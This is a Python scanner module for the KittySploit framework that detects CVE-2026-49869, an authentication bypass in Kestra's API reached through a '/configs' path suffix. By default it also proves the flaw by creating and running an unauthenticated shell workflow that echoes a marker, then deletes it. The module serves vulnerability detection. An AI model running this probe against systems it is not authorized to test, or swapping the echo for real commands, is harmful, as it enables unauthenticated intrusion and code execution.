#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect Kestra CVE-2026-49869 /configs suffix authentication filter bypass."""

import secrets
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Kestra CVE-2026-49869 Auth Bypass Detect",
        "description": (
            "Detects CVE-2026-49869 in Kestra OSS before 1.0.45 / 1.3.21: "
            "AuthenticationFilter forwards any /api/v1/** path ending in /configs "
            "without Basic Auth. Compares a blocked path with the bypass suffix, "
            "then optionally confirms with a benign echo flow (create, execute, cleanup)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-49869"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-49869",
            "https://github.com/kestra-io/kestra/security/advisories/GHSA-5vc5-wxxq-3fjx",
        ],
        "modules": ["exploits/multi/http/kestra_cve_2026_49869_rce"],
        "tags": [
            "web",
            "scanner",
            "kestra",
            "auth-bypass",
            "rce",
            "workflow",
            "cve-2026-49869",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 6,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.5,
            "noise": 0.45,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["kestra"],
                "endpoint_pattern_any": ["/api/v1/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "/configs suffix"},
                    {"capability": "rce", "from_detail": "shell workflow plugin"},
                ],
                "suggested_followups": [
                    "exploits/multi/http/kestra_cve_2026_49869_rce",
                ],
            },
        },
    }

    port = OptPort(8080, "Kestra webserver HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    tenant = OptString("main", "Kestra tenant id in API paths", False, advanced=True)
    active_probe = OptBool(
        True,
        "Confirm with benign echo flow (PUT/POST/DELETE, auto-cleanup)",
        False,
    )

    def _api(self, suffix: str) -> str:
        base = (self.path or "/").rstrip("/")
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    def _is_kestra(self) -> bool:
        for probe in ("/ui/login?from=/dashboards", "/"):
            response = self.http_request(method="GET", path=probe, allow_redirects=True)
            if not response:
                continue
            body = response.text or ""
            if "Kestra" in body or "window.KESTRA_UI_PATH" in body:
                return True
        return False

    def _auth_differential(self, namespace: str) -> bool:
        tenant = str(self.tenant or "main").strip() or "main"
        blocked = self._api(f"/api/v1/{tenant}/flows/{namespace}/blocked")
        bypass = self._api(f"/api/v1/{tenant}/flows/{namespace}/configs")
        r_block = self.http_request(method="GET", path=blocked, allow_redirects=False)
        r_bypass = self.http_request(method="GET", path=bypass, allow_redirects=False)
        if not r_block or not r_bypass:
            return False
        blocked_code = int(r_block.status_code or 0)
        bypass_code = int(r_bypass.status_code or 0)
        return blocked_code == 401 and bypass_code != 401

    def _active_confirm(self, namespace: str, marker: str) -> bool:
        tenant = str(self.tenant or "main").strip() or "main"
        flow_path = self._api(f"/api/v1/{tenant}/flows/{namespace}/configs")
        yaml_body = (
            "id: configs\n"
            f"namespace: {namespace}\n"
            "tasks:\n"
            "  - id: probe\n"
            "    type: io.kestra.plugin.scripts.shell.Commands\n"
            "    commands:\n"
            f"      - echo {marker}\n"
        )
        create = self.http_request(
            method="PUT",
            path=flow_path,
            headers={"Content-Type": "application/x-yaml"},
            data=yaml_body,
            allow_redirects=False,
        )
        if not create or int(create.status_code or 0) not in (200, 201, 204):
            return False
        exec_path = self._api(f"/api/v1/{tenant}/executions/{namespace}/configs")
        trigger = self.http_request(method="POST", path=exec_path, allow_redirects=False)
        if not trigger or int(trigger.status_code or 0) not in (200, 201, 202):
            self.http_request(method="DELETE", path=flow_path, allow_redirects=False)
            return False
        execution_id = ""
        try:
            payload = trigger.json()
            execution_id = str((payload or {}).get("id") or "")
        except Exception:
            execution_id = ""
        found = False
        if execution_id:
            logs_path = self._api(
                f"/api/v1/{tenant}/logs/search?executionId={execution_id}"
            )
            deadline = time.time() + max(int(self.timeout or 15), 20)
            while time.time() < deadline:
                logs = self.http_request(method="GET", path=logs_path, allow_redirects=False)
                body = (logs.text or "") if logs else ""
                if marker in body:
                    found = True
                    break
                time.sleep(2)
        self.http_request(method="DELETE", path=flow_path, allow_redirects=False)
        return found

    def run(self):
        if not self._is_kestra():
            return False
        namespace = f"kitty{secrets.token_hex(3)}"
        if not self._auth_differential(namespace):
            return False
        if bool(self.active_probe):
            marker = f"kittysploit-{secrets.token_hex(4)}"
            if not self._active_confirm(namespace, marker):
                self.set_info(
                    severity="high",
                    cve="CVE-2026-49869",
                    reason=(
                        "/configs suffix bypasses Basic Auth but active echo probe "
                        "did not confirm execution"
                    ),
                    namespace=namespace,
                )
                return True
        self.set_info(
            severity="critical",
            cve="CVE-2026-49869",
            reason="Unauthenticated /configs suffix bypass confirmed on Kestra API",
            namespace=namespace,
        )
        return True
